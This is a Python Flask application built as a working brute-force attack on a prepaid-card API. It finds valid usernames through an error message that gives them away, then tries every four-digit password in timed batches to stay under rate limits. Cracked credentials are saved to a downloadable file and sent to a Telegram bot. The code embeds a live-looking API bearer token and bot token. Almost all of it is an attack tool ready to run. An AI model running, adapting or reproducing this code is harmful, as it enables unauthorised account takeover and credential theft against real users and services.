from flask import Flask, render_template, jsonify, send_file
import requests
import random
import time
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import urllib.parse # Import for URL encoding if needed (though not strictly required for this Telegram payload)

app = Flask(__name__)

# Global variables to track progress
current_step = "Initializing"
valid_usernames = [] # Usernames found to be valid for password attempts
tried_passwords = {} # Dictionary: username -> set of passwords tried for this username (that failed)
current_username = "" # The username currently being processed for passwords
total_requests = 0 # Total requests for the *current* operation (username scan batch or password batch)
processed_requests = 0 # Processed requests for the *current* operation
is_running = False
success_info = [] # Global list holding successful attempts

# Configuration
API_URL = "https://bc.red-radius.com/api/v1/prepaid-cards"
AUTH_HEADER = "Bearer 1|qkzMyzrJjNKSekHzcmL9QIT80pZsHRJLFp9EWyE198d26f1d"
LANGUAGE = "ar"
STATE_FILE = "bruteforce_state.json"
SUCCESS_FILE = "successes.json" # File to save successful attempts

# Telegram Configuration
BOT_TOKEN = "5540358750:AAEbbNLxeyj3IwAn90Jumy5C5a1qTbTzzM" # Replace with your actual bot token if different
CHAT_ID = "962451110" # Replace with your actual user/chat ID

# --- State Management (Valid Usernames & Tried Passwords) ---
def load_state():
    """Loads valid usernames and tried passwords from the state file."""
    if os.path.exists(STATE_FILE) and os.path.getsize(STATE_FILE) > 0:
        try:
            with open(STATE_FILE, 'r') as f:
                state = json.load(f)
                loaded_usernames = state.get("valid_usernames", [])
                loaded_tried_passwords = {}
                # Convert lists of passwords back to sets
                for user, passwords_list in state.get("tried_passwords", {}).items():
                    # Ensure passwords_list is actually a list before converting to set
                    if isinstance(passwords_list, list):
                         loaded_tried_passwords[user] = set(passwords_list)
                    else:
                         print(f"Warning: Invalid data format for tried_passwords for user {user} in state file.")
                         loaded_tried_passwords[user] = set() # Initialize as empty set
                print(f"Loaded state from {STATE_FILE}: {len(loaded_usernames)} usernames, {sum(len(p) for p in loaded_tried_passwords.values())} tried attempts.")
                return loaded_usernames, loaded_tried_passwords
        except json.JSONDecodeError as e:
            print(f"Warning: Could not decode JSON from {STATE_FILE}: {e}. Starting state fresh.")
            return [], {}
        except Exception as e:
             print(f"Error loading state from {STATE_FILE}: {e}. Starting state fresh.")
             return [], {}
    print(f"State file {STATE_FILE} not found or is empty. Starting state fresh.")
    return [], {}

def save_state():
    """Saves valid usernames and tried passwords to the state file."""
    # Convert sets of passwords to lists for JSON serialization
    serializable_tried_passwords = {}
    for user, passwords_set in tried_passwords.items():
        # Ensure passwords_set is actually a set before converting to list
        if isinstance(passwords_set, set):
             serializable_tried_passwords[user] = list(passwords_set)
        else:
             print(f"Warning: Invalid data type for tried_passwords for user {user} in memory. Skipping save for this user's passwords.")
             # Optionally save an empty list or try to recover if needed

    state = {
        "valid_usernames": valid_usernames,
        "tried_passwords": serializable_tried_passwords
    }
    try:
        with open(STATE_FILE, 'w') as f:
            json.dump(state, f, indent=4)
        # print(f"State saved to {STATE_FILE}") # Optional: log every save (can be noisy)
    except Exception as e:
        print(f"Error saving state to {STATE_FILE}: {e}")


# --- State Management for Successes ---
def load_successes():
    """Loads successful attempts from the successes file."""
    if os.path.exists(SUCCESS_FILE) and os.path.getsize(SUCCESS_FILE) > 0:
        try:
            with open(SUCCESS_FILE, 'r') as f:
                successes = json.load(f)
                # Optional: Basic validation that it's a list
                if isinstance(successes, list):
                     print(f"Loaded {len(successes)} successes from {SUCCESS_FILE}")
                     return successes
                else:
                     print(f"Warning: Successes file {SUCCESS_FILE} contains invalid data format. Starting successes fresh.")
                     return []
        except json.JSONDecodeError as e:
            print(f"Warning: Could not decode JSON from {SUCCESS_FILE}: {e}. Starting successes fresh.")
            return []
        except Exception as e:
             print(f"Error loading successes from {SUCCESS_FILE}: {e}. Starting successes fresh.")
             return []
    print(f"Successes file {SUCCESS_FILE} not found or is empty. Starting successes fresh.")
    return []

def save_success(success_entry):
    """Appends a new success entry to the successes file and global list."""
    global success_info # Access the global list
    # Check if this specific success is already in memory to avoid duplicates on repeated saves
    # A simple check on username and password should be sufficient for uniqueness
    if not any(s.get('username') == success_entry.get('username') and s.get('password') == success_entry.get('password') for s in success_info):
        success_info.append(success_entry)
        try:
            # Save the entire updated list to the file
            with open(SUCCESS_FILE, 'w') as f:
                json.dump(success_info, f, indent=4)
            print(f"Saved success for {success_entry.get('username')}/{success_entry.get('password')} to {SUCCESS_FILE}")
        except Exception as e:
            print(f"Error saving successes to file {SUCCESS_FILE}: {e}")
    # Else: It's already in memory/file, do nothing


# --- Telegram Notification Function ---
def send_telegram_success_notification(success_entry):
    """Sends a success notification to the configured Telegram chat."""
    # Escape special characters for MarkdownV2: _, *, [, ], (, ), ~, `, >, #, +, -, =, |, {, }, ., !
    def escape_markdown_v2(text):
        if not isinstance(text, str):
            text = str(text)
        # Only escape characters that are not part of code blocks (`) or links []()
        # Simplified escaping for common use cases, might need refinement based on specific API response content
        escape_chars = r'_*[]()~`>#+-=|{}.!'
        return "".join(["\\" + char if char in escape_chars else char for char in text])


    message_text = f"""
🎉 Bruteforce Success Found! 🎉

*Username*: `{escape_markdown_v2(success_entry.get('username', 'N/A'))}`
*Password*: `{escape_markdown_v2(success_entry.get('password', 'N/A'))}`
*Status*: `{escape_markdown_v2(success_entry.get('status', 'N/A'))}`
*Duration*: `{escape_markdown_v2(success_entry.get('duration', 'N/A'))}`
*Remaining*: `{escape_markdown_v2(success_entry.get('remaining', 'N/A'))}`
*Timestamp*: `{escape_markdown_v2(success_entry.get('timestamp', 'N/A'))}`
"""
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message_text,
        "parse_mode": "MarkdownV2" # Use MarkdownV2 for formatting
    }
    try:
        # Use a separate, non-blocking request if possible (not directly in `requests`),
        # or keep a small timeout to avoid blocking the main thread for too long.
        # A very short timeout (e.g., 1-2 seconds) might fail often but won't hold up the bruteforce.
        # A longer timeout (e.g., 10 seconds) is more reliable for sending but can block.
        # Threading the notification send is an option for full non-blocking, but adds complexity.
        response = requests.post(telegram_url, json=payload, timeout=10) # Keep timeout at 10s for reliability
        response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
        # print(f"Telegram notification sent successfully for {success_entry['username']}") # Optional: log every notification
    except requests.exceptions.RequestException as e:
        print(f"Error sending Telegram notification for {success_entry.get('username', 'N/A')}: {e}")
    except Exception as e:
        print(f"An unexpected error occurred while sending Telegram notification for {success_entry.get('username', 'N/A')}: {e}")


# --- Request Sending Function ---
def send_request(payload):
    """Sends a single request to the target API."""
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": AUTH_HEADER,
        "Accept-Language": LANGUAGE
    }
    try:
        response = requests.post(API_URL, json=payload, headers=headers, timeout=30)
        response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
        return response.json(), payload
    except requests.exceptions.RequestException as e:
        # Catch specific requests exceptions (connection errors, timeouts, HTTP errors)
        error_message = str(e)
        # print(f"Request failed for payload {payload}: {error_message}") # Optional: log all request failures
        return {"error": error_message, "message": "Request failed"}, payload # Return a structured error response
    except Exception as e:
        # Catch any other unexpected errors
        error_message = str(e)
        print(f"An unexpected error occurred during request for payload {payload}: {error_message}")
        return {"error": error_message, "message": "Unexpected error"}, payload


# --- Password Brute-forcing Logic (Modified) ---
def try_passwords_batch(username, start_idx):
    """
    Tries all 1000 passwords within the range starting at start_idx,
    skipping those already marked as tried.
    """
    global current_step, processed_requests, total_requests, success_info, tried_passwords

    # Passwords in this batch range (0000-0999, 1000-1999, etc.)
    batch_passwords = [str(i).zfill(4)
                       for i in range(start_idx, min(start_idx + 1000, 10000))]

    # Filter out passwords that have already been tried and failed for this username
    passwords_to_send = [p for p in batch_passwords
                         if username not in tried_passwords or p not in tried_passwords[username]]

    total_requests = len(passwords_to_send) # Total requests is now only the ones we haven't tried
    processed_requests = 0 # Reset processed count for this batch

    current_step = f"🔐 Trying passwords {start_idx:04d} - {min(start_idx + 999, 9999):04d} for: {username} ({len(passwords_to_send)}/{len(batch_passwords)} new attempts in batch)"
    print(current_step)

    if not passwords_to_send:
        print(f"All passwords in range {start_idx:04d}-{min(start_idx + 999, 9999):04d} for {username} already tried. Skipping batch.")
        return False # No new passwords to try in this batch

    # Ensure the username exists in tried_passwords if it's not already there
    # This prevents errors when adding failed passwords later
    tried_passwords.setdefault(username, set())


    for password in passwords_to_send:
        payload = {"username": username, "password": password}

        result, sent_payload = send_request(payload)
        processed_requests += 1

        # Check for success message (or absence of known error message and absence of error key)
        # Assuming success is indicated by a message *not* being the specific error AND no 'error' key in result
        if result and result.get("message") != "خطأ في إسم المستخدم أو كلمة المرور" and "error" not in result:
             # Success found!
             # Note: API might return something else on success, check the actual successful response structure
             # If the response contains status/duration/remaining, it's likely a success
             success_entry = {
                 "username": username,
                 "password": password,
                 "status": result.get("status", "Success (Msg: " + str(result.get('message', 'N/A')) + ")"), # Use result status if available, fallback to message
                 "duration": result.get("duration", "N/A"),
                 "remaining": result.get("remaining", "N/A"),
                 "timestamp": time.strftime("%Y-%m-%d %H:%M:%S") # Add timestamp
             }

             # --- Send Telegram Notification ---
             send_telegram_success_notification(success_entry)
             # ------------------------------------

             save_success(success_entry) # Save to file and update in-memory list
             current_step = f"🎉 SUCCESS found for {username} with password {password}!"
             print(current_step)

             # Save state immediately after a success to record tried passwords up to this point
             # and ensures valid_usernames and tried_passwords state is current.
             save_state()
             return True # Indicate success, move to next username

        # If the result is the specific "incorrect password" message or a request error,
        # mark this combination as tried.
        elif result and (result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور" or "error" in result):
            tried_passwords[username].add(password)
            # print(f"Marked {username}/{password} as tried (failed or error).") # Optional: very noisy log

        # Optional: Log other unexpected successful messages that aren't the specific error
        # elif result and "message" in result and result.get("message") != "خطأ في إسم المستخدم أو كلمة المرور":
        #      print(f"API returned unexpected message for {username}/{password}: {result.get('message', 'N/A')}")


    # If loop finishes without finding success in this 1000-password batch
    # Save state after trying a full batch for a user (even if no success in this batch)
    # This saves the newly added failed attempts for this batch.
    save_state() # Save after a batch is complete
    return False


# --- Background Processing Thread ---
def background_process():
    global current_step, valid_usernames, total_requests, processed_requests, is_running, current_username, success_info, tried_passwords

    # Load existing state and successes on startup
    loaded_usernames, loaded_tried_passwords = load_state()
    valid_usernames.extend(loaded_usernames) # Add loaded usernames to current list
    # Merge loaded tried passwords into the global dictionary
    for user, passwords_set in loaded_tried_passwords.items():
        tried_passwords.setdefault(user, set()).update(passwords_set)


    success_info.extend(load_successes()) # Add loaded successes to current list

    print("Background process started.")
    print(f"Initial valid usernames: {len(valid_usernames)}")
    print(f"Initial tried password attempts: {sum(len(p) for p in tried_passwords.values())}")
    print(f"Initial successes: {len(success_info)}")


    while True:
        if is_running:
            try:
                # --- Phase 1: Scan for potential valid usernames ---
                current_step = "🔍 Scanning usernames concurrently..."
                print(current_step)
                prefix = "20" # Based on original code
                # Generate a new batch of usernames to test
                usernames_to_scan = [f"{prefix}{random.randint(100000, 999999)}" for _ in range(1000)]
                payloads = [{"username": u} for u in usernames_to_scan]
                total_requests = len(payloads)
                processed_requests = 0
                newly_found_valid_usernames_count = 0

                # Using ThreadPoolExecutor for scanning
                with ThreadPoolExecutor(max_workers=30) as executor: # Adjusted max_workers
                    futures = {executor.submit(send_request, payload): payload for payload in payloads}

                    for future in as_completed(futures):
                        payload = futures[future]
                        try:
                            result, _ = future.result()
                            processed_requests += 1
                            # Identify potentially valid usernames based on the specific error message
                            # Also ensure the username is not already in our valid_usernames list
                            if result and result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور":
                                username = payload["username"]
                                if username not in valid_usernames: # Avoid duplicates
                                     valid_usernames.append(username)
                                     newly_found_valid_usernames_count += 1 # Track newly found
                                     # print(f"Valid username candidate found: {username}") # Optional: print candidates

                        except Exception as e:
                            # Note: send_request already prints basic error for individual requests
                            pass # Handle exceptions from futures if needed, but send_request handles request errors


                # Save state if new valid usernames were found
                if newly_found_valid_usernames_count > 0:
                     save_state() # Save the updated valid usernames list and tried passwords
                     current_step = f"✅ Found {newly_found_valid_usernames_count} new valid usernames. Total: {len(valid_usernames)}"
                     print(current_step)
                else:
                     current_step = f"🔍 Scanned {len(usernames_to_scan)} usernames. No new valid candidates found in this batch. Total valid: {len(valid_usernames)}"
                     print(current_step)


                # --- Phase 2: Try passwords for discovered valid usernames ---
                # Iterate through the list of valid usernames.
                # Use a copy [:] to iterate in case the list is modified elsewhere (unlikely, but safe)
                # Iterate through valid usernames starting from the beginning of the list each cycle.
                for username in valid_usernames[:]:
                    current_username = username
                    # Check if this username already has a success entry in the global list
                    if any(s.get('username') == username for s in success_info):
                         # print(f"Skipping username {username}, success already found.")
                         continue # Skip if already successful

                    current_step = f"🔐 Starting password attempts for: {username}"
                    print(current_step)

                    # Iterate through password ranges (0-999, 1000-1999, ..., 9000-9999)
                    # try_passwords_batch will try passwords within the range that haven't been marked as tried
                    success_for_user_found = False
                    for start_idx in range(0, 10000, 1000):
                         # Check if *any* passwords in this batch range (start_idx to start_idx+999)
                         # *could* potentially be tried (i.e., not all 1000 are already marked as tried)
                         batch_passwords_range = [str(i).zfill(4) for i in range(start_idx, min(start_idx + 1000, 10000))]
                         untried_in_batch = [p for p in batch_passwords_range
                                             if username not in tried_passwords or p not in tried_passwords[username]]

                         if not untried_in_batch:
                            # print(f"All passwords in range {start_idx:04d}-{min(start_idx + 999, 9999):04d} for {username} already tried. Skipping range.")
                            continue # Skip this password batch range entirely

                         # If there are potentially untried passwords in this batch range, try them
                         if try_passwords_batch(username, start_idx): # <--- Calling the function here
                            success_for_user_found = True
                            break # Success found for this username, move to the next valid username

                        # If no success in this batch (up to 1000 attempts), wait before the next batch (next 1000 range)
                        # This block executes if try_passwords_batch returned False (meaning no success in that batch)
                         # print(f"No success in batch {start_idx:04d}-{min(start_idx + 999, 9999):04d} for {username}. Waiting 60s before next range.")
                         # >>>>>>>>>> FIX WAS HERE <<<<<<<<<<
                         current_step = f"🛌 Waiting 60s before trying next batch ({start_idx+1000:04d}-...) for {username}"
                         print(current_step)
                         time.sleep(60)


                    if not success_for_user_found:
                         print(f"Finished all password ranges for {username} without success in this run or all possible passwords tried.")
                    # save_state() is called by try_passwords_batch after each batch, so not strictly needed here.


                current_step = "😴 Sleeping before next scan cycle..."
                print(current_step)
                save_state() # Final state save before a longer sleep
                time.sleep(600) # Sleep longer between full cycles


            except Exception as e:
                current_step = f"Fatal Error in background process: {str(e)}"
                print(current_step)
                # Save state on error might help recover progress
                save_state()
                # Avoid tight loop on error
                time.sleep(60)
        else:
            # App is not running, just sleep
            current_step = "🛑 Process is stopped."
            time.sleep(5)

# --- Flask Routes ---
@app.route('/')
def home():
    # The global variables are updated by the background thread.
    return render_template(
        'index.html',
        current_step=current_step,
        valid_usernames=valid_usernames, # Pass the global list
        progress=(processed_requests / total_requests * 100) if total_requests > 0 else 0,
        success_info=success_info # Pass the global list
    )

@app.route('/state.json')
def get_state_file():
    """Endpoint to download the username state file."""
    if os.path.exists(STATE_FILE):
        return send_file(STATE_FILE, as_attachment=True)
    else:
        return jsonify({"error": "State file not found"}), 404

@app.route('/successes.json')
def get_success_file():
    """Endpoint to download the successes file."""
    if os.path.exists(SUCCESS_FILE):
        return send_file(SUCCESS_FILE, as_attachment=True)
    else:
        return jsonify({"error": "Successes file not found"}), 404


@app.route('/status')
def status():
    """Endpoint to get current status and data as JSON for UI updates."""
    # Calculate total number of tried passwords across all users for display?
    total_tried_count = sum(len(tried_passwords.get(user, set())) for user in valid_usernames) # Only count for valid users
    return jsonify({
        'current_step': current_step,
        'valid_usernames': valid_usernames,
        'total_tried_passwords_count': total_tried_count,
        'current_username': current_username,
        'progress': (processed_requests / total_requests * 100) if total_requests > 0 else 0,
        'is_running': is_running,
        'success_info': success_info # Include the global list of successes
    })

@app.route('/toggle')
def toggle():
    """Endpoint to start or stop the background process."""
    global is_running
    is_running = not is_running
    if is_running:
        current_step = "▶️ Process is starting..."
    else:
        current_step = "⏸️ Process is stopping..."
    print(current_step) # Log the change
    return jsonify({'is_running': is_running})

# --- Main Execution ---
if __name__ == '__main__':
    # Load initial state and successes before starting the background thread and Flask app
    # This ensures globals are populated immediately if files exist.
    # Note: background_process also loads them, but loading them here makes them available
    # to Flask routes immediately upon startup before the background thread completes its first load.
    # It's slightly redundant but harmless if merge logic is correct.
    # Let's stick to loading only in background_process to avoid race conditions or double loading issues easily.
    # So, remove the initial load here and rely solely on the background thread's load.

    bg_thread = threading.Thread(target=background_process, daemon=True)
    bg_thread.start()

    # Run without debug for stability in production
    # Set threaded=True explicitly for Flask, although it's often the default with multiple requests
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
